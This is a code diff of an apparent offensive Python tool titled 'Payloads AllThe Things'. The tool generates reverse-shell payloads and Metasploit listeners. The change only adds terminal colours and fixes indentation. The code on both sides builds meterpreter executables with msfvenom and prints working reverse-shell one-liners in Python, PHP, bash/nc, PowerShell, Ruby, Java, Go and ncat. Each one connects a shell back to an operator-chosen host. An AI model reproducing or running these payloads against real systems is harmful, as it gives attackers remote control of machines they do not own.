@@ -2,24 +2,25 @@ import os
 import subprocess
 import pyfiglet
 import time
+from termcolor import colored
 
 retu = "Ctrl + C => Return To Main\n\n"
 
 try:
     def Windows_Reverse_Shell():
         os.system("clear")
-        ascii_banner = pyfiglet.figlet_format("windows\nReverseShell")
-        print(ascii_banner)
+        ascii_banner = pyfiglet.figlet_format("windows\nReverseShell\nPayload")
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
         subprocess.call(
             f"""msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -f exe -o payload.exe""", shell=True)
         x = input("""
-    We Make Payload Sucss 
+We Make Payload Sucss
 
-    Do You Want To Start Listener? y/n : """)
+Do You Want To Start Listener? y/n : """)
         if x == "y":
             try:
                 os.remove("msf.rc")
@@ -28,11 +29,11 @@ try:
             subprocess.call("touch msf.rc", shell=True)
             file = open("msf.rc", "a")
             file.write(f"""
-    use exploit/multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST {ipaddr}
-    set LPORT {port}
-    exploit
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST {ipaddr}
+set LPORT {port}
+exploit
             """)
             file.close()
             # time.sleep(2)
@@ -43,17 +44,17 @@ try:
     def Python_Reverse_Shell_msf():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Python\nPayload")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
         subprocess.call(
             f"""msfvenom -p python/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -o payload.py""", shell=True)
         x = input("""
-    We Make Payload Sucss 
+We Make Payload Sucss
 
-    Do You Want To Start Listener? y/n : """)
+Do You Want To Start Listener? y/n : """)
         if x == "y":
             try:
                 os.remove("msf.rc")
@@ -62,11 +63,11 @@ try:
             subprocess.call("touch msf.rc", shell=True)
             file = open("msf.rc", "a")
             file.write(f"""
-    use exploit/multi/handler
-    set payload python/meterpreter/reverse_tcp
-    set LHOST {ipaddr}
-    set LPORT {port}
-    exploit
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST {ipaddr}
+set LPORT {port}
+exploit
             """)
             file.close()
             # time.sleep(2)
@@ -77,14 +78,15 @@ try:
     def Python3_Reverse_Shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Python3\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print(f"""
-    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipaddr}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (f"""
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipaddr}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
         """)
+        print(colored(ff, "white"))
 
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
@@ -97,15 +99,15 @@ try:
     def php_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("PHP\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print(f"""
-    php -r '$sock=fsockopen("{ipaddr}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (f"""
+php -r '$sock=fsockopen("{ipaddr}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
         """)
-
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -117,15 +119,15 @@ try:
     def bash_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Bash\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print(f"""
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (f"""
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f
         """)
-
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -137,14 +139,15 @@ try:
     def powershell_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("PowerShell\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print('powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("' + ipaddr+'",' + port +
-              ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"')
-
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (
+            'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("' + ipaddr+'",' + port +
+            ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"')
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -156,14 +159,15 @@ try:
     def rubby_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Rubby\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print(f"""
-        ruby -rsocket -e'f=TCPSocket.open("{ipaddr}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (f"""
+ruby -rsocket -e'f=TCPSocket.open("{ipaddr}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
         """)
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -175,14 +179,15 @@ try:
     def java_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Java\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print(f"""
-    Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ipaddr}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (f"""
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ipaddr}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
         """)
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -194,13 +199,15 @@ try:
     def golang_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Golang\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print('echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' + ipaddr + ':' + port +
-              '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go')
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (
+            'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' + ipaddr + ':' + port +
+            '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go')
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -212,18 +219,19 @@ try:
     def ncat_reverse_shell():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Ncat\nReverseShell")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
-        print(f"""
-    For Linux :
-        ncat {ipaddr} {port} -e /bin/bash
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
+        ff = (f"""
+For Linux :
+    ncat {ipaddr} {port} -e /bin/bash
 
-    For Windows:
-        ncat {ipaddr} {port} -e cmd.exe
+For Windows:
+    ncat {ipaddr} {port} -e cmd.exe
         """)
+        print(colored(ff, "white"))
         x = input("[+] Do You Want To Start Listener ? y/n : ")
 
         if x == "y":
@@ -235,26 +243,29 @@ try:
     def linux_reverse_tcp():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Linux\nReverseTcp")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         print("\n\n")
         print(retu)
-        ipaddr = input("[-] Enter Your Ip : ")
-        port = input("[+] Enter Your Port : ")
+        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
+        port = input(colored("\n[+] Enter Your Port : ", "blue"))
         subprocess.call(
             f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ipaddr} LPORT={port} -f elf > payload.elf", shell=True)
         x = input("""
-    We Make Payload Sucss 
+We Make Payload Sucss
 
-    Do You Want To Start Listener? y/n : """)
+Do You Want To Start Listener? y/n : """)
         if x == "y":
-            os.remove("msf.rc")
+            try:
+                os.remove("msf.rc")
+            except:
+                pass
             file = open("msf.rc", "a")
             file.write(f"""
-    use exploit/multi/handler
-    set payload linux/x86/meterpreter/reverse_tcp
-    set LHOST {ipaddr}
-    set LPORT {port}
-    exploit -j
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST {ipaddr}
+set LPORT {port}
+exploit -j
             """)
             file.close()
             subprocess.call("msfconsole -r msf.rc", shell=True)
@@ -264,14 +275,14 @@ try:
     def main():
         os.system("clear")
         ascii_banner = pyfiglet.figlet_format("Payloads\nAllThe\nThings")
-        print(ascii_banner)
+        print(colored(ascii_banner, "yellow"))
         try:
-            payload_num = int(input("""
+            payload_num = int(input(colored("""
 
 [1] Windows Reverse Shell Payload x64 (metasploit)
 [2] Python Payload (metasploit)
 [3] Python3 Reverse Shell
-[4] PHP Reverse Shell 
+[4] PHP Reverse Shell
 [5] Bash Reverse Shell
 [6] Powershell Reverse Shell
 [7] Ruby Reverse Shell
@@ -282,7 +293,7 @@ try:
 
 [00] EXIT
 
-[+] Chose Numper : """))
+[+] Chose Numper : """, "cyan")))
         except ValueError:
             print("{+} Wrong ....")
             time.sleep(3)
